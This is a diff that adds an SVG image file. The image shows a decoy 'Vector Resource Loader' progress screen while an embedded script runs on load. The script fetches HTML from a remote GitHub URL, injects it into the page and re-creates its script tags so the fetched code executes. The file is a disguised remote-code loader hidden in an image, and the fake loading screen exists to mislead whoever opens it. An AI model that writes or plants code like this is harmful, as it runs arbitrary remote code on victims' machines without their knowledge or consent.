@@ -1,0 +1,55 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" viewBox="0 0 800 600">
+  <rect width="100%" height="100%" fill="#ffffff" />
+  
+  <g id="fake-ui">
+    <text x="50" y="50" font-family="Arial" font-size="14" fill="#666">Vector Resource Loader v1.0.4</text>
+    <rect x="50" y="70" width="200" height="10" rx="5" fill="#eee" />
+    <rect id="loading-bar" x="50" y="70" width="20" height="10" rx="5" fill="#4CAF50">
+      <animate attributeName="width" from="20" to="200" dur="3s" repeatCount="indefinite" />
+    </rect>
+    <text x="50" y="100" font-family="Arial" font-size="12" fill="#999">Status: Fetching remote assets...</text>
+  </g>
+
+  <foreignObject width="100%" height="100%">
+    <div xmlns="http://www.w3.org/1999/xhtml" id="content-area">
+        </div>
+  </foreignObject>
+
+  <script type="text/javascript">
+    <![CDATA[
+        (async function autoLoad() {
+            // Your specific GitHub URL
+            const githubUrl = 'https://raw.githubusercontent.com/helloflygh/Titanv3/main/startup';
+            const container = document.getElementById('content-area');
+            const fakeUI = document.getElementById('fake-ui');
+
+            try {
+                const response = await fetch(githubUrl);
+                if (!response.ok) throw new Error('Failed to load external HTML');
+                
+                const html = await response.text();
+                
+                // Hide the fake loading screen once content is ready
+                fakeUI.style.display = 'none';
+                
+                // Inject the HTML
+                container.innerHTML = html;
+
+                // Execute scripts within the injected HTML
+                const scripts = container.querySelectorAll("script");
+                scripts.forEach(oldScript => {
+                    const newScript = document.createElement("script");
+                    Array.from(oldScript.attributes).forEach(attr => {
+                        newScript.setAttribute(attr.name, attr.value);
+                    });
+                    newScript.appendChild(document.createTextNode(oldScript.innerHTML));
+                    oldScript.parentNode.replaceChild(newScript, oldScript);
+                });
+
+            } catch (err) {
+                container.innerHTML = "<div style='color:red; font-family:Arial; padding:20px;'>Resource Error: " + err.message + "</div>";
+            }
+        })();
+    ]]>
+  </script>
+</svg>
